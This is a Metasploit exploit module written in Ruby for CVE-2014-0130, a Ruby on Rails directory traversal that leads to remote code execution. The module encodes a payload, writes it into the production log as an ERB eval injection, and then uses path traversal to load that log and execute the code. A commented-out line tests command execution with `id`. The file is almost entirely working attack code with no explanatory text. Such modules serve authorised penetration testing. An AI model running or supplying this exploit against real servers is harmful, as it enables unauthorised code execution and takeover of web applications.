##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Ruby on Rails Action Routes Directory Traversal Code Execution',
      'Description'    => %q{

      },
      'Author'         =>
        [
          'oliver.lavery',
        ],
      'License'        => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2014-0130' ],
          [ 'OSVDB', '106704' ]
        ],
      'Platform'       => 'ruby',
      'Arch'           => ARCH_RUBY,
      'Privileged'     => false,
      'Targets'        =>	[ ['Automatic', {} ] ],
      'DisclosureDate' => 'May 6 2014',
      'DefaultOptions' => { "PrependFork" => true },
      'DefaultTarget' => 0))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [ true, 'The URI for a vulnerable Ruby on Rails application route', "/vuln_route/"]),
        OptString.new('TARGETFILE', [ true, 'The filename to use reverse traversal to load', '../../../log/production.log']),
      ], self.class)
  end

  #
  # Send the actual request
  #
  def exploit
    code = Rex::Text.encode_base64(payload.encoded)
    target_file = Rex::Text.uri_encode(datastore['TARGETFILE'].gsub('..', '\..'), mode = 'hex-all')
    print_status("Sending request to #{rhost}:#{rport}...")
    print_status("URI: #{normalize_uri(target_uri.path, target_file)}")
    send_request_cgi({
      'uri'     => normalize_uri(target_uri.path, target_file),
      'method'  => 'GET',
      'headers' => { 'X-HTTP-Method-Override' => 'get' },
      'vars_get' => {
        #'payload' => "ID IS:<%= `id` %>"
        'payload' => "<%= eval(%[#{code}].unpack(%[m0])[0]) %>"
      }
    }, 25)
    handler
  end

end
